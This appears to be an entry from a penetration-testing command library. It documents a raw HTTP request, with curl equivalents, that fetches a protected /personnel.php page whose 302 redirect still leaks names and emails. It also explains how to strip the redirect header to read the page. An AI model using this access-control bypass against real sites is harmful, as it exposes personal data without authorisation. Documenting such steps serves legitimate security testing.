---
data: >-
  GET /personnel.php HTTP/1.1

  Host: target

  User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101
  Firefox/60.0

  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

  Accept-Language: ru,en-US;q=0.7,en;q=0.3

  Accept-Encoding: gzip, deflate

  Cookie: JSESSIONID=example; __VCAP_ID__=example; TS01771652=example;
  TS01771652031=example; TSf7f79454027=example

  Connection: close

  Upgrade-Insecure-Requests: 1

  Content-Length: 1
tags:
  - http-request
  - recon
type: command
output: |-
  HTTP/1.1 302 Found
  Location: login.php
  Content-Type: text/html
  [Full HTML body with sensitive content including user names and emails]
executor: http
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:28:51.990Z'
id: 0a4bc2eb-8eea-408f-8c4c-7539b38c89ff
verified: false
validated: true
submitted: true
---
# http-get-personnel-php

## Command

```
GET /personnel.php HTTP/1.1
Host: target
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: ru,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Cookie: JSESSIONID=example; __VCAP_ID__=example; TS01771652=example; TS01771652031=example; TSf7f79454027=example
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 1
```

## Description

This raw HTTP GET request targets a protected endpoint (/personnel.php) in a vulnerable web application, triggering a redirect response that leaks sensitive HTML content. Use in tools like Burp Suite, curl, or netcat to simulate unauthenticated access and intercept the response for modification.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| Host | Target domain (e.g., target) | Yes |
| User-Agent | Browser identifier string | Yes |
| Accept | MIME types accepted | Yes |
| Accept-Language | Preferred languages | Yes |
| Accept-Encoding | Compression support | Yes |
| Cookie | Session and tracking cookies (e.g., JSESSIONID) | No |
| Connection | Connection handling (close) | Yes |
| Upgrade-Insecure-Requests | Flag for secure upgrades | Yes |
| Content-Length | Body length (minimal) | Yes |

## Examples

### Basic Usage

Send via curl to replicate:

```bash
curl -X GET "https://target/personnel.php" -H "Host: target" -H "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" -H "Accept-Language: ru,en-US;q=0.7,en;q=0.3" -H "Accept-Encoding: gzip, deflate" -H "Cookie: JSESSIONID=example" -H "Connection: close" --insecure
```

### Advanced Usage

Include full cookies for session simulation:

```bash
curl -X GET "https://target/personnel.php" -H "Cookie: JSESSIONID=example; __VCAP_ID__=example; TS01771652=example" -H "Connection: close" --insecure
```

## Expected Output

A 302 redirect to login.php with the full HTML body of the protected page, revealing user names, emails, and internal details. Without modification, the browser redirects; with header removal, content is displayed.

## Related

- [[procedures/Bypass-Access-Control-by-Modifying-Redirect-Response-with-Burp-Suite]]
